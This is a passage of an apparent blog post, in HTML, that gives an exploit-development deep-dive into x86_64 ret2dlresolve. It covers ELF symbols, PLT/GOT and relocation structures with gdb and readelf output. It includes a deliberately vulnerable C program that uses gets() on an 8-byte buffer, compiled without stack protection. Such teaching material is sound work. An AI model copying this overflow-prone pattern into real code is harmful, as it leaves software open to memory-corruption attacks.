@@ -1,0 +1,650 @@
+<!DOCTYPE html>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+<html lang="en"><head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  
+
+  <title>
+    
+      A technical deep-dive into x86_64 Ret2dlResolve
+    
+  </title>
+
+  <!-- Begin Jekyll SEO tag v2.6.1 -->
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="A technical deep-dive into x86_64 Ret2dlResolve" />
+<meta name="author" content="David Fernandez" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content=". *.#@ **./@@ % (%*@ %, %..@ @ @% *.@..,,,,@@ .# %, . @. * #..,,,,....*/**%% #/% .@..@@@@@.**##*/ @ @(@* #,,@@@@....%%/.** @#/.........@@....,,..../, # ( /*....,,,,,,,,,,..../,/#@ @ *@#(........,*.%*../..@@..,,(/ @.......,,%/(,*(,,........../% # /.....,@/,#@.*.#. ( %@,,....(% ( @,.....@@@. .(@ ...( ( @#(,@@....*(@@ ,@,......* %#,(* @,,@/,#*@,....,%@ @.(....*,..*/.#(( (@@(@#.#@.....*. @ /@.,..../,.#.. @@@@@@@@/.*@....*,%% @@*%....*, % .@@@@@@@@ @. ,((.@,.@@, .*%%##(/.....,(#....@@@@@@@@@@@@@@,,* *....(% /*%.%%% @@,. @.@@...@@ @@@@@@@@@@./ % @@/* %%%%, . ...@..,,,,..(/% ...@@@....,,..@@@@@@(. (....... ..,,*,.@,.(%,.@@@@....,,,,..@@@@@.(/..........@@@(@ ,,..,,**,,**.* /...@@@....@@..@@@@@@@ #(....,,,@..,,..,@..(*...,@@....@@@@..@@@@ @/@....,,,,,,.. /@ **,,....,,,,**@.,......@@@@@@@ .@@@@..(/....*,,,,..*,,,*.%/#........@@@@@@@@,.@@@@/.@#,,..,,,,,,.#@ ,,../%,,,,,,@@@@,@...@@@@@@@@@@@@@@@.@/#@@...@@%.*/*,,,.,#%*......@@@@@@@@@@.....@. *@*,..(%*,@@,.@ ,(,... ..@@@....@@@@@@@@@@@@@@@@@..@@@@@*,.,/# /....* /@......@@@@@@@@@@... @@@@*.@.,. @, @#,... ..#@@....@@@@@@@@@@@@@@@@@./ @@@@*,(./#/*....%(/@......@@@@@@@@@@... @@@@/@@.@ ./, ..,.@@*. @@@@@..@@@@@@@@@@@@@@@@@.%/@@@@( %@*(*@....(,/@,.....@@@@@@@@@@... @@..(%@..@/,@ , @,@@...(@@. ...@@@@@@@@@...@@@@@@......%@, @@@@@@@.,.%......@@@@@@@@@@.. @@ (#/..,.#. , ,*.... /.@,.....@@@@@@.....@@@#.(,.....*%@@@#%.......,........@@@@@@....@@@@(*/@..,.*% ( .*.... *@.,.....@@@@@@.....@@@/#/.....( %. (.....,.%........@@@@@@....@@,. # @@.,.%# . %/.....,%@@@@.............@@@@# .@,,,,**.@...*((.,,.,*/*@...........@@@@@@,(,/..../,#% @%@....,,(@ ..@.. @@@@@@@@.@.#,,.*/**%. %@@.@##..,,.. @.. @@@@@@@@@@ #, @,.....%@ @ ,*....* .( (.*,,,, @(#(%@ ,,,,%#% .@ #,(@..,**,.@//@@....% @,((((..,,@./@,# @#,,....,%,*#(.@@@@@,*/.#.@#,,,,%%%@.@ .,@*...,.@(#%/@*@@ @@@@ ,, ...,,*,,#/. # @....,,..%/.,((/(%* @@@@@,,,,.%@@ %%%% . /,,%@@,@@...%**#.*, /./..,,,,,@.%% ,%%....,.,,.......... .,,* /* %%%%%%% .@ @#@..,...............,,**(%## ,@.*%/.@..........,,...(,#(@@ %%%%%%%% @@/.#/,((...............,,@*@( * ,/. .@........,,,,,,##@#. @ %%%%%%%% @@.%,, ,(%..............,,#( @ @@,@*@*#.*.@,*%#@%.(/% @ %%%%%%%%%% .,(,(*#(* #@ #/%,/ /%@@ @@@@ .... **,@ %%%%%%%%%%%% @ *..%#@@ ..@@.. @@ . (,@@@ %%%%%%%%%%%% @ (.,,(*@. ,/@@@@@ %%%%%%%%%%%% @ %#*..( . %%@ @@.@ %%%%%%%%%%%%% @@(,.. #.@ ,. %@% @@@%@ %%%%%%%%%%%% @@ @,.(/.@ . #(@ @@.@ @ %%%%%%%% @@@@.%/.%@... (#/ @@.@ @ %%%%%%%% @@@@%%@#@.(@( , *%% @@ %%%%%%%% % %%. #%/.@% @ @@ %% .@. @@.@ @@.@ %%%%%% @@ @(%. %.... %(, #%... .%*,@#((%,*# %@@ @@#.,(,# @###@.. *%,%%@@ . .%(( ...@...@(@ ,,#,#@.@@ @@@@%@*/(@, # ..... (.%% % * %..* /...%.@@@.. #@.#/###@@@@@@@@ ..//%(.#@ @...@... .( %#(.. #@...%(. @%%/................%# %%..@ %((*##%..................#*@%%% %%,%.#..*. /%*....@.# /* .................. . %#( ,*,# @@@.....................*%%( %*.......* %%,....... @.@%/....................# .. @@%*@..@........................ @#.. #,......# @/......................................#@%%%.......................................,% .................................... ./%%%.%(@..................................# ,% ,/ %................................ %................................. // * %#................................*/ @@% ,%..............................%. / ............................./% @(.#............................% *//..................,.#. . (@%%..................** % (,,.(%.%%%@..#. #..((%%% **@....#.@@..(..,@%*, %% @%%%,% @(.%@...%./,%%%%% %%.% %/.@.@...@%%%%(%(%%" />
+<meta property="og:description" content=". *.#@ **./@@ % (%*@ %, %..@ @ @% *.@..,,,,@@ .# %, . @. * #..,,,,....*/**%% #/% .@..@@@@@.**##*/ @ @(@* #,,@@@@....%%/.** @#/.........@@....,,..../, # ( /*....,,,,,,,,,,..../,/#@ @ *@#(........,*.%*../..@@..,,(/ @.......,,%/(,*(,,........../% # /.....,@/,#@.*.#. ( %@,,....(% ( @,.....@@@. .(@ ...( ( @#(,@@....*(@@ ,@,......* %#,(* @,,@/,#*@,....,%@ @.(....*,..*/.#(( (@@(@#.#@.....*. @ /@.,..../,.#.. @@@@@@@@/.*@....*,%% @@*%....*, % .@@@@@@@@ @. ,((.@,.@@, .*%%##(/.....,(#....@@@@@@@@@@@@@@,,* *....(% /*%.%%% @@,. @.@@...@@ @@@@@@@@@@./ % @@/* %%%%, . ...@..,,,,..(/% ...@@@....,,..@@@@@@(. (....... ..,,*,.@,.(%,.@@@@....,,,,..@@@@@.(/..........@@@(@ ,,..,,**,,**.* /...@@@....@@..@@@@@@@ #(....,,,@..,,..,@..(*...,@@....@@@@..@@@@ @/@....,,,,,,.. /@ **,,....,,,,**@.,......@@@@@@@ .@@@@..(/....*,,,,..*,,,*.%/#........@@@@@@@@,.@@@@/.@#,,..,,,,,,.#@ ,,../%,,,,,,@@@@,@...@@@@@@@@@@@@@@@.@/#@@...@@%.*/*,,,.,#%*......@@@@@@@@@@.....@. *@*,..(%*,@@,.@ ,(,... ..@@@....@@@@@@@@@@@@@@@@@..@@@@@*,.,/# /....* /@......@@@@@@@@@@... @@@@*.@.,. @, @#,... ..#@@....@@@@@@@@@@@@@@@@@./ @@@@*,(./#/*....%(/@......@@@@@@@@@@... @@@@/@@.@ ./, ..,.@@*. @@@@@..@@@@@@@@@@@@@@@@@.%/@@@@( %@*(*@....(,/@,.....@@@@@@@@@@... @@..(%@..@/,@ , @,@@...(@@. ...@@@@@@@@@...@@@@@@......%@, @@@@@@@.,.%......@@@@@@@@@@.. @@ (#/..,.#. , ,*.... /.@,.....@@@@@@.....@@@#.(,.....*%@@@#%.......,........@@@@@@....@@@@(*/@..,.*% ( .*.... *@.,.....@@@@@@.....@@@/#/.....( %. (.....,.%........@@@@@@....@@,. # @@.,.%# . %/.....,%@@@@.............@@@@# .@,,,,**.@...*((.,,.,*/*@...........@@@@@@,(,/..../,#% @%@....,,(@ ..@.. @@@@@@@@.@.#,,.*/**%. %@@.@##..,,.. @.. @@@@@@@@@@ #, @,.....%@ @ ,*....* .( (.*,,,, @(#(%@ ,,,,%#% .@ #,(@..,**,.@//@@....% @,((((..,,@./@,# @#,,....,%,*#(.@@@@@,*/.#.@#,,,,%%%@.@ .,@*...,.@(#%/@*@@ @@@@ ,, ...,,*,,#/. # @....,,..%/.,((/(%* @@@@@,,,,.%@@ %%%% . /,,%@@,@@...%**#.*, /./..,,,,,@.%% ,%%....,.,,.......... .,,* /* %%%%%%% .@ @#@..,...............,,**(%## ,@.*%/.@..........,,...(,#(@@ %%%%%%%% @@/.#/,((...............,,@*@( * ,/. .@........,,,,,,##@#. @ %%%%%%%% @@.%,, ,(%..............,,#( @ @@,@*@*#.*.@,*%#@%.(/% @ %%%%%%%%%% .,(,(*#(* #@ #/%,/ /%@@ @@@@ .... **,@ %%%%%%%%%%%% @ *..%#@@ ..@@.. @@ . (,@@@ %%%%%%%%%%%% @ (.,,(*@. ,/@@@@@ %%%%%%%%%%%% @ %#*..( . %%@ @@.@ %%%%%%%%%%%%% @@(,.. #.@ ,. %@% @@@%@ %%%%%%%%%%%% @@ @,.(/.@ . #(@ @@.@ @ %%%%%%%% @@@@.%/.%@... (#/ @@.@ @ %%%%%%%% @@@@%%@#@.(@( , *%% @@ %%%%%%%% % %%. #%/.@% @ @@ %% .@. @@.@ @@.@ %%%%%% @@ @(%. %.... %(, #%... .%*,@#((%,*# %@@ @@#.,(,# @###@.. *%,%%@@ . .%(( ...@...@(@ ,,#,#@.@@ @@@@%@*/(@, # ..... (.%% % * %..* /...%.@@@.. #@.#/###@@@@@@@@ ..//%(.#@ @...@... .( %#(.. #@...%(. @%%/................%# %%..@ %((*##%..................#*@%%% %%,%.#..*. /%*....@.# /* .................. . %#( ,*,# @@@.....................*%%( %*.......* %%,....... @.@%/....................# .. @@%*@..@........................ @#.. #,......# @/......................................#@%%%.......................................,% .................................... ./%%%.%(@..................................# ,% ,/ %................................ %................................. // * %#................................*/ @@% ,%..............................%. / ............................./% @(.#............................% *//..................,.#. . (@%%..................** % (,,.(%.%%%@..#. #..((%%% **@....#.@@..(..,@%*, %% @%%%,% @(.%@...%./,%%%%% %%.% %/.@.@...@%%%%(%(%%" />
+<link rel="canonical" href="http://0.0.0.0:4000/2024/05/11/ret2dlresolve.html" />
+<meta property="og:url" content="http://0.0.0.0:4000/2024/05/11/ret2dlresolve.html" />
+<meta property="og:site_name" content="Litios Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-05-11T00:00:00+02:00" />
+<script type="application/ld+json">
+{"headline":"A technical deep-dive into x86_64 Ret2dlResolve","url":"http://0.0.0.0:4000/2024/05/11/ret2dlresolve.html","datePublished":"2024-05-11T00:00:00+02:00","dateModified":"2024-05-11T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/2024/05/11/ret2dlresolve.html"},"author":{"@type":"Person","name":"David Fernandez"},"@type":"BlogPosting","description":". *.#@ **./@@ % (%*@ %, %..@ @ @% *.@..,,,,@@ .# %, . @. * #..,,,,....*/**%% #/% .@..@@@@@.**##*/ @ @(@* #,,@@@@....%%/.** @#/.........@@....,,..../, # ( /*....,,,,,,,,,,..../,/#@ @ *@#(........,*.%*../..@@..,,(/ @.......,,%/(,*(,,........../% # /.....,@/,#@.*.#. ( %@,,....(% ( @,.....@@@. .(@ ...( ( @#(,@@....*(@@ ,@,......* %#,(* @,,@/,#*@,....,%@ @.(....*,..*/.#(( (@@(@#.#@.....*. @ /@.,..../,.#.. @@@@@@@@/.*@....*,%% @@*%....*, % .@@@@@@@@ @. ,((.@,.@@, .*%%##(/.....,(#....@@@@@@@@@@@@@@,,* *....(% /*%.%%% @@,. @.@@...@@ @@@@@@@@@@./ % @@/* %%%%, . ...@..,,,,..(/% ...@@@....,,..@@@@@@(. (....... ..,,*,.@,.(%,.@@@@....,,,,..@@@@@.(/..........@@@(@ ,,..,,**,,**.* /...@@@....@@..@@@@@@@ #(....,,,@..,,..,@..(*...,@@....@@@@..@@@@ @/@....,,,,,,.. /@ **,,....,,,,**@.,......@@@@@@@ .@@@@..(/....*,,,,..*,,,*.%/#........@@@@@@@@,.@@@@/.@#,,..,,,,,,.#@ ,,../%,,,,,,@@@@,@...@@@@@@@@@@@@@@@.@/#@@...@@%.*/*,,,.,#%*......@@@@@@@@@@.....@. *@*,..(%*,@@,.@ ,(,... ..@@@....@@@@@@@@@@@@@@@@@..@@@@@*,.,/# /....* /@......@@@@@@@@@@... @@@@*.@.,. @, @#,... ..#@@....@@@@@@@@@@@@@@@@@./ @@@@*,(./#/*....%(/@......@@@@@@@@@@... @@@@/@@.@ ./, ..,.@@*. @@@@@..@@@@@@@@@@@@@@@@@.%/@@@@( %@*(*@....(,/@,.....@@@@@@@@@@... @@..(%@..@/,@ , @,@@...(@@. ...@@@@@@@@@...@@@@@@......%@, @@@@@@@.,.%......@@@@@@@@@@.. @@ (#/..,.#. , ,*.... /.@,.....@@@@@@.....@@@#.(,.....*%@@@#%.......,........@@@@@@....@@@@(*/@..,.*% ( .*.... *@.,.....@@@@@@.....@@@/#/.....( %. (.....,.%........@@@@@@....@@,. # @@.,.%# . %/.....,%@@@@.............@@@@# .@,,,,**.@...*((.,,.,*/*@...........@@@@@@,(,/..../,#% @%@....,,(@ ..@.. @@@@@@@@.@.#,,.*/**%. %@@.@##..,,.. @.. @@@@@@@@@@ #, @,.....%@ @ ,*....* .( (.*,,,, @(#(%@ ,,,,%#% .@ #,(@..,**,.@//@@....% @,((((..,,@./@,# @#,,....,%,*#(.@@@@@,*/.#.@#,,,,%%%@.@ .,@*...,.@(#%/@*@@ @@@@ ,, ...,,*,,#/. # @....,,..%/.,((/(%* @@@@@,,,,.%@@ %%%% . /,,%@@,@@...%**#.*, /./..,,,,,@.%% ,%%....,.,,.......... .,,* /* %%%%%%% .@ @#@..,...............,,**(%## ,@.*%/.@..........,,...(,#(@@ %%%%%%%% @@/.#/,((...............,,@*@( * ,/. .@........,,,,,,##@#. @ %%%%%%%% @@.%,, ,(%..............,,#( @ @@,@*@*#.*.@,*%#@%.(/% @ %%%%%%%%%% .,(,(*#(* #@ #/%,/ /%@@ @@@@ .... **,@ %%%%%%%%%%%% @ *..%#@@ ..@@.. @@ . (,@@@ %%%%%%%%%%%% @ (.,,(*@. ,/@@@@@ %%%%%%%%%%%% @ %#*..( . %%@ @@.@ %%%%%%%%%%%%% @@(,.. #.@ ,. %@% @@@%@ %%%%%%%%%%%% @@ @,.(/.@ . #(@ @@.@ @ %%%%%%%% @@@@.%/.%@... (#/ @@.@ @ %%%%%%%% @@@@%%@#@.(@( , *%% @@ %%%%%%%% % %%. #%/.@% @ @@ %% .@. @@.@ @@.@ %%%%%% @@ @(%. %.... %(, #%... .%*,@#((%,*# %@@ @@#.,(,# @###@.. *%,%%@@ . .%(( ...@...@(@ ,,#,#@.@@ @@@@%@*/(@, # ..... (.%% % * %..* /...%.@@@.. #@.#/###@@@@@@@@ ..//%(.#@ @...@... .( %#(.. #@...%(. @%%/................%# %%..@ %((*##%..................#*@%%% %%,%.#..*. /%*....@.# /* .................. . %#( ,*,# @@@.....................*%%( %*.......* %%,....... @.@%/....................# .. @@%*@..@........................ @#.. #,......# @/......................................#@%%%.......................................,% .................................... ./%%%.%(@..................................# ,% ,/ %................................ %................................. // * %#................................*/ @@% ,%..............................%. / ............................./% @(.#............................% *//..................,.#. . (@%%..................** % (,,.(%.%%%@..#. #..((%%% **@....#.@@..(..,@%*, %% @%%%,% @(.%@...%./,%%%%% %%.% %/.@.@...@%%%%(%(%%","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+  <link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:4000/feed.xml" title="Litios Blog" />
+
+  <link rel="shortcut icon" type="image/x-icon" href="/./logo.ico" />
+  <link rel="stylesheet" href="http://0.0.0.0:4000/assets/css/main.css" />
+  <link href="https://fonts.googleapis.com/icon?family=Material+Icons"
+      rel="stylesheet">
+</head>
+<body a="light" style="color: #f2f2f2">
+    <main class="page-content" aria-label="Content">
+        <div class="w">
+            <div style="display: flex; justify-content: space-between;">
+<a style="font-size: 2em;" href="http://0.0.0.0:4000">..</a>
+<span onClick="if (document.body.style.color != 'rgb(242, 242, 242)'){
+document.body.style.color = '#f2f2f2'; document.body.style.backgroundColor = '#202324';
+} else {
+document.body.style.color = 'black'; document.body.style.backgroundColor = 'white';
+}
+" class="material-icons" style="
+    cursor: pointer;
+    display:flex;
+    flex-direction:column;
+    justify-content:end;
+    align-items:center;
+">visibility</span>
+</div>
+<br><br><br>
+<pre style="font-size: 0.9vw; text-align: center">
+                                                                                                                               
+                          .   *.#@ **./@@  %                              (%*@  %, %..@ @                     
+                        @% *.@..,,,,@@ .# %, .                      @. * #..,,,,....*/**%%                      
+                        #/% .@..@@@@@.**##*/ @                      @(@* #,,@@@@....%%/.**                        
+                    @#/.........@@....,,..../, #                (   /*....,,,,,,,,,,..../,/#@                     
+                @ *@#(........,*.%*../..@@..,,(/                  @.......,,%/(,*(,,........../%                  
+                #  /.....,@/,#@.*.#.  ( %@,,....(% (         @,.....@@@. .(@ ...( ( @#(,@@....*(@@                
+                 ,@,......* %#,(* @,,@/,#*@,....,%@          @.(....*,..*/.#((  (@@(@#.#@.....*.                  
+              @ /@.,..../,.#..  @@@@@@@@/.*@....*,%%        @@*%....*, %  .@@@@@@@@ @. ,((.@,.@@,                 
+        .*%%##(/.....,(#....@@@@@@@@@@@@@@,,* *....(% /*%.%%% @@,. @.@@...@@  @@@@@@@@@@./ %  @@/*  %%%%, .       
+        ...@..,,,,..(/% ...@@@....,,..@@@@@@(. (....... ..,,*,.@,.(%,.@@@@....,,,,..@@@@@.(/..........@@@(@       
+        ,,..,,**,,**.* /...@@@....@@..@@@@@@@ #(....,,,@..,,..,@..(*...,@@....@@@@..@@@@ @/@....,,,,,,.. /@       
+        **,,....,,,,**@.,......@@@@@@@ .@@@@..(/....*,,,,..*,,,*.%/#........@@@@@@@@,.@@@@/.@#,,..,,,,,,.#@       
+        ,,../%,,,,,,@@@@,@...@@@@@@@@@@@@@@@.@/#@@...@@%.*/*,,,.,#%*......@@@@@@@@@@.....@. *@*,..(%*,@@,.@       
+            ,(,... ..@@@....@@@@@@@@@@@@@@@@@..@@@@@*,.,/# /....* /@......@@@@@@@@@@... @@@@*.@.,. @,             
+            @#,... ..#@@....@@@@@@@@@@@@@@@@@./ @@@@*,(./#/*....%(/@......@@@@@@@@@@... @@@@/@@.@ ./,             
+            ..,.@@*. @@@@@..@@@@@@@@@@@@@@@@@.%/@@@@( %@*(*@....(,/@,.....@@@@@@@@@@... @@..(%@..@/,@             
+            , @,@@...(@@. ...@@@@@@@@@...@@@@@@......%@, @@@@@@@.,.%......@@@@@@@@@@..  @@ (#/..,.#.              
+            , ,*.... /.@,.....@@@@@@.....@@@#.(,.....*%@@@#%.......,........@@@@@@....@@@@(*/@..,.*%              
+            ( .*.... *@.,.....@@@@@@.....@@@/#/.....(  %.  (.....,.%........@@@@@@....@@,. # @@.,.%#              
+            . %/.....,%@@@@.............@@@@# .@,,,,**.@...*((.,,.,*/*@...........@@@@@@,(,/..../,#%              
+             @%@....,,(@ ..@..  @@@@@@@@.@.#,,.*/**%.  %@@.@##..,,..   @..  @@@@@@@@@@ #, @,.....%@               
+                @ ,*....* .( (.*,,,, @(#(%@ ,,,,%#% .@      #,(@..,**,.@//@@....% @,((((..,,@./@,#                
+                @#,,....,%,*#(.@@@@@,*/.#.@#,,,,%%%@.@      .,@*...,.@(#%/@*@@ @@@@ ,, ...,,*,,#/.                
+                 # @....,,..%/.,((/(%* @@@@@,,,,.%@@  %%%%  . /,,%@@,@@...%**#.*, /./..,,,,,@.%%                  
+                   ,%%....,.,,..........  .,,* /*    %%%%%%%  .@ @#@..,...............,,**(%##                    
+                    ,@.*%/.@..........,,...(,#(@@   %%%%%%%%  @@/.#/,((...............,,@*@(                      
+                    * ,/. .@........,,,,,,##@#. @   %%%%%%%%  @@.%,, ,(%..............,,#(  @                     
+                        @@,@*@*#.*.@,*%#@%.(/%    @ %%%%%%%%%%  .,(,(*#(*  #@ #/%,/ /%@@                          
+                        @@@@    ....    **,@      %%%%%%%%%%%%   @ *..%#@@  ..@@..    @@                          
+                                        . (,@@@   %%%%%%%%%%%%    @ (.,,(*@.                                      
+                                        ,/@@@@@   %%%%%%%%%%%%    @ %#*..( .                                      
+                                        %%@ @@.@ %%%%%%%%%%%%%    @@(,.. #.@                                      
+                                    ,. %@%  @@@%@ %%%%%%%%%%%%    @@ @,.(/.@                                      
+                                    . #(@   @@.@  @ %%%%%%%%    @@@@.%/.%@...                                     
+                                    (#/     @@.@  @ %%%%%%%%    @@@@%%@#@.(@(                                     
+                                   , *%%        @@  %%%%%%%%        % %%. #%/.@%    @                             
+                @@               %% .@.  @@.@  @@.@  %%%%%%  @@     @(%.  %....                                  
+             %(,                #%... .%*,@#((%,*# %@@        @@#.,(,# @###@.. *%,%%@@            .               
+            .%((                 ...@...@(@  ,,#,#@.@@      @@@@%@*/(@, # ..... (.%%              % *             
+             %..*               /...%.@@@.. #@.#/###@@@@@@@@ ..//%(.#@  @...@... .(             %#(..             
+            #@...%(.        @%%/................%# %%..@ %((*##%..................#*@%%%    %%,%.#..*.            
+            /%*....@.#     /* .................. .  %#( ,*,# @@@.....................*%%(   %*.......*            
+            %%,....... @.@%/....................# .. @@%*@..@........................ @#.. #,......#              
+              @/......................................#@%%%.......................................,%              
+                .................................... ./%%%.%(@..................................# ,%              
+                ,/ %................................        %................................. //                 
+                * %#................................*/    @@% ,%..............................%. /                
+                    ............................./%           @(.#............................%                   
+                       *//..................,.#.                . (@%%..................** %                      
+                        (,,.(%.%%%@..#. #..((%%%                    **@....#.@@..(..,@%*, %%                      
+                        @%%%,% @(.%@...%./,%%%%%                    %%.% %/.@.@...@%%%%(%(%%                      
+</pre>
+
+<h2 id="background-theory">Background theory</h2>
+
+<h3 id="elfs-and-symbols">ELFs and symbols</h3>
+
+<p>ELFs define executable pieces as symbols. These symbols can later be used by other ELFs.</p>
+
+<p>In order to import symbols, the linker needs to connect these references so those addresses point to the right place.</p>
+
+<p>There are 2 options here:</p>
+
+<ol>
+  <li><strong>Static linking</strong>: the symbols will be resolved at compiled time and embedded into the final binary.</li>
+  <li><strong>Dynamic linking</strong>: this technique uses a process of resolving the symbol called relocation. <a href="https://docs.oracle.com/cd/E23824_01/html/819-0690/chapter3-7.html">Lazy binding</a> (relocation at runtime) happens during the first call of the function through PLT and GOT.</li>
+</ol>
+
+<h3 id="plt-and-got">PLT and GOT</h3>
+
+<ul>
+  <li>GOT (Global offset table) contains the actual addresses of the symbols (or the hook to resolve them)</li>
+  <li>PLT (Procedural Linking Table) contains short functions that make a call to the proper GOT entry.</li>
+</ul>
+
+<h3 id="understanding-symbol-resolution">Understanding symbol resolution</h3>
+
+<p>The flow that depicts how this happens is presented in the following diagram:</p>
+
+<p><img src="/./assets/imgs/ret2dlresolve_unresolved.png" /></p>
+
+<p>Let’s see what’s going on with a simple program that calls 2 functions:</p>
+
+<pre><code class="language-C">
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main() {
+    char buf[8];
+    gets(buf);
+    puts(buf);
+    return 0;
+}
+</code></pre>
+<p>Compile with:</p>
+
+<p><code class="language-plaintext highlighter-rouge">$ gcc test.c -no-pie -o test -fno-stack-protector</code></p>
+
+<p>Now, let’s fire gdb and see the result:</p>
+
+<blockquote>
+  <p>I have gef installed, in case the input does not match exactly but you should be able to follow along still!</p>
+</blockquote>
+
+<ol>
+  <li>Function <code class="language-plaintext highlighter-rouge">main</code> calls <code class="language-plaintext highlighter-rouge">gets</code> and <code class="language-plaintext highlighter-rouge">puts</code> functions. This is translated as a call to the PLT entry for <code class="language-plaintext highlighter-rouge">gets</code> <code class="language-plaintext highlighter-rouge">gets@plt</code> and <code class="language-plaintext highlighter-rouge">puts</code> <code class="language-plaintext highlighter-rouge">puts@plt</code>:</li>
+</ol>
+
+<pre><code class="language-asm">    gef➤  disass main
+   0x0000000000401163 &lt;+0&gt;:	endbr64
+   0x0000000000401167 &lt;+4&gt;:	push   rbp
+   0x0000000000401168 &lt;+5&gt;:	mov    rbp,rsp
+   0x000000000040116b &lt;+8&gt;:	sub    rsp,0x10
+   0x000000000040116f &lt;+12&gt;:	lea    rax,[rip+0xe8e]        # 0x402004
+   0x0000000000401176 &lt;+19&gt;:	mov    rdi,rax
+   0x0000000000401179 &lt;+22&gt;:	call   0x401050 &lt;puts@plt&gt;
+   0x000000000040117e &lt;+27&gt;:	lea    rax,[rbp-0x10]
+   0x0000000000401182 &lt;+31&gt;:	mov    rdi,rax
+   0x0000000000401185 &lt;+34&gt;:	mov    eax,0x0
+   0x000000000040118a &lt;+39&gt;:	call   0x401060 &lt;gets@plt&gt;
+   0x000000000040118f &lt;+44&gt;:	lea    rax,[rbp-0x10]
+   0x0000000000401193 &lt;+48&gt;:	mov    rdi,rax
+   0x0000000000401196 &lt;+51&gt;:	call   0x401050 &lt;puts@plt&gt;
+   0x000000000040119b &lt;+56&gt;:	mov    eax,0x0
+   0x00000000004011a0 &lt;+61&gt;:	leave
+   0x00000000004011a1 &lt;+62&gt;:	ret
+</code></pre>
+
+<ol>
+  <li>Function <code class="language-plaintext highlighter-rouge">gets@plt</code> consists of:</li>
+</ol>
+
+<pre><code class="language-asm">gef➤  disass 0x401060
+Dump of assembler code for function gets@plt:
+   0x0000000000401060 &lt;+0&gt;: endbr64 
+   0x0000000000401064 &lt;+4&gt;: bnd jmp QWORD PTR [rip+0x2fb5]        # 0x404020 &lt;gets@got.plt&gt;
+   0x000000000040106b &lt;+11&gt;: nop    DWORD PTR [rax+rax*1+0x0]
+</code></pre>
+
+<ol>
+  <li>Function <code class="language-plaintext highlighter-rouge">puts@plt</code> consists of:</li>
+</ol>
+
+<pre><code class="language-asm">gef➤  disass 0x401050
+Dump of assembler code for function puts@plt:
+   0x0000000000401050 &lt;+0&gt;: endbr64 
+   0x0000000000401054 &lt;+4&gt;: bnd jmp QWORD PTR [rip+0x2fbd]        # 0x404018 &lt;puts@got.plt&gt;
+   0x000000000040105b &lt;+11&gt;: nop    DWORD PTR [rax+rax*1+0x0]
+</code></pre>
+
+<p>And where do they come from? Those values come from the PLTREL <code class="language-plaintext highlighter-rouge">.rela.plt</code></p>
+
+<hr />
+<h4 id="pltrel-and-elf64_rel">PLTREL and Elf64_Rel</h4>
+
+<p>The first piece of the puzzle is a structure called <a href="https://llvm.org/doxygen/structllvm_1_1ELF_1_1Elf64__Rel.html">Elf64_Rel</a>.</p>
+
+<p>This structure contains two fields:</p>
+
+<p><code class="language-plaintext highlighter-rouge">r_offset</code>: This address points to the GOT address of the symbol.</p>
+
+<p><code class="language-plaintext highlighter-rouge">r_info</code>: This value actually represents two different pieces of information.</p>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">symbol (getSymbol function)</code>: this is used as an index for the list of Elf64_Sym, as in <code class="language-plaintext highlighter-rouge">list_of_elf64_sym[symbol]</code></p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">type (getType function)</code> we will talk more about this one later, but in our case it should be 7.</p>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> #define R_X86_64_JUMP_SLOT	7	/* Create PLT entry */
+ assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);
+ #define ELF_MACHINE_JMP_SLOT	R_X86_64_JUMP_SLOT
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<blockquote>
+  <p>If curious, other relocation types can be found at: <code class="language-plaintext highlighter-rouge">/arch/x86/include/asm/elf.h</code> in the Linux kernel source code.</p>
+</blockquote>
+
+<p>We can conveniently retrieve those values with <code class="language-plaintext highlighter-rouge">readelf -r test</code></p>
+<pre><code class="language-asm">Relocation section '.rela.plt' at offset 0x500 contains
+
+  Offset          Info           Type           Sym. Value    Sym. Name + Addend
+000000404018  000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
+000000404020  000400000007 R_X86_64_JUMP_SLO 0000000000000000 gets@GLIBC_2.2.5 + 0
+</code></pre>
+
+<p>or through gdb, first by finding out the location of <code class="language-plaintext highlighter-rouge">.rela.plt</code> with <code class="language-plaintext highlighter-rouge">info file</code>:</p>
+
+<p><code class="language-plaintext highlighter-rouge">0x0000000000400500 - 0x0000000000400530 is .rela.plt</code></p>
+
+<p>and then inspecting the memory addresses.</p>
+
+<hr />
+
+<ol>
+  <li>If we check the memory values of <code class="language-plaintext highlighter-rouge">r_offset</code> we can see:</li>
+</ol>
+
+<pre><code class="language-asm">gef➤  x/2wx 0x404020
+0x404020 &lt;gets@got.plt&gt;: 0x00401040 0x00000000
+gef➤  x/2wx 0x404018
+0x404018 &lt;puts@got.plt&gt;: 0x00401030 0x00000000
+</code></pre>
+
+<p>And those point to:</p>
+
+<pre><code class="language-asm">gef➤  x/3i 0x00401030
+   0x401030: endbr64 
+   0x401034: push   0x0
+   0x401039: bnd jmp 0x401020
+gef➤  x/3i 0x00401040
+   0x401040: endbr64 
+   0x401044: push   0x1
+   0x401049: bnd jmp 0x401020
+gef➤  x/10i 0x401020
+   0x401020: push   QWORD PTR [rip+0x2fe2]        # 0x404008
+   0x401026: bnd jmp QWORD PTR [rip+0x2fe3]        # 0x404010
+gef➤  x/2wx 0x404010
+0x404010: 0xf7fd8d30 0x00007fff
+gef➤  disass 0x00007ffff7fd8d30
+Dump of assembler code for function _dl_runtime_resolve_xsavec:
+...
+</code></pre>
+
